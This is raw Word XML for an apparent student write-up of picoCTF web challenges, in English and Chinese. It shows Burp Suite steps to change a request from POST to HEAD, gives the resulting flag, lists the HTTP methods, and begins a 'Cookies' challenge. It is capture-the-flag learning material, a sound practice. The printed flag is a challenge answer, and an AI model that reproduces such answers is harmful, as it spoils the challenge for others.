    <w:p w14:paraId="186F9C04" w14:textId="4987FC51" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Go to firefox launch a webpage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E77DF4" w14:textId="784BC687" w:rsidR="00E50ED3" w:rsidRDefault="00000000" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidR="00F25C59" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:21939/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E0C2B0C" w14:textId="2F723F96" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00F25C59">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Turn on intercept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B288E71" w14:textId="0C24F37A" w:rsidR="00E50ED3" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Click on blue button</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009D45A6" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F5521C2" w14:textId="44C85B19" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="555B9F61" wp14:editId="5098724E">
            <wp:extent cx="6332220" cy="26320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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2632075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F216C85" w14:textId="7DB818A7" w:rsidR="00222A2A" w:rsidRDefault="00222A2A" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C566516" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Right click it -&gt; send to Repeater</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96A852" w14:textId="44A339E3" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Change Post method to HEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F08598" w14:textId="0E955A99" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Send the request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C15C47" w14:textId="77777777" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55E6E08D" w14:textId="1EFDC837" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76C3D116" wp14:editId="51139C3E">
            <wp:extent cx="6332220" cy="20758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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2075815"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F6B735" w14:textId="66271915" w:rsidR="00F25C59" w:rsidRDefault="00F25C59" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F25C59">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>flag: picoCTF{r3j3ct_th3_du4l1ty_6ef27873}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FA35F7" w14:textId="0DF4F776" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4782AD13" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>请求方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B367F4D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>定义了一组请求方法，以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作。虽然他们也可以是名词，但这些请求方法有时被称为</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>动词。每一个请求方法都实现了不同的语义，但一些共同的特征由一组共享：例如一个请求方法可以是</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> safe, idempotent, </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> cacheable (en-US)</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BE9F29" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FECE134" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8864BA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法请求一个指定资源的表示形式，使用</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>的请求应该只被用于获取数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048D0F70" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3295E353" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>HEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3EC45D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">HEAD </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法请求一个与</w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>请求的响应相同的响应，但没有响应体。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FFFC1F" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04783763" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F189D7" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">POST </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5741AB69" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D59BEBA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F6A868" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">PUT </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用请求有效载荷替换目标资源的所有当前表示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA77884" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56C75EE1" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398FD28D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">DELETE </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法删除指定的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8D4BE1" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10A4DCB8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>CONNECT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB43A7D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">CONNECT </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法建立一个到由目标资源标识的服务器的隧道。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6034975D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C9FAF56" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>OPTIONS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75166D4D" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">OPTIONS </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于描述目标资源的通信选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786C14DC" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65693FB8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>TRACE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BE632B" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">TRACE </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法沿着到目标资源的路径执行一个消息环回测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEF1C9F" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2329DBDA" w14:textId="77777777" w:rsidR="0096174C" w:rsidRPr="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>PATCH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C61C39" w14:textId="1F7D8183" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">PATCH </w:t>
      </w:r>
      <w:r w:rsidRPr="0096174C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>方法用于对资源应用部分修改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDE31B1" w14:textId="6325287E" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB163FD" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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Cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F55C217"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 | 40 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4803DCBF"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573876E8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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369539" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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07779C" w14:textId="6A568B8D" w:rsidR="0096174C" w:rsidRDefault="0096174C"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Who doesn't love cookies? Try to figure out the best one. </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:17781/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15349D6F" w14:textId="1E8857E9"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25638CC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点击链接，页面如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771D3D8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7CE78ED" w14:textId="41AB7931"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0B3EFBB" wp14:editId="6FE4D83E">
            <wp:extent cx="6332220" cy="457073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4570730"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0701F2F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0D1CF0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随便在框里输入内容，显示如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C004AA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23E0140" w14:textId="747713E0"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1B3DEDAB" wp14:editId="63226DF7">
            <wp:extent cx="6332220" cy="37312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731260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC2E0B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234D9D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输出返回无效的</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409556B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C2C3C8B"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这题也有两种写法！！！！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081B625D"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99304D" w14:textId="3BEC7F45"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一、检查开发人员工具的选项卡（查看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
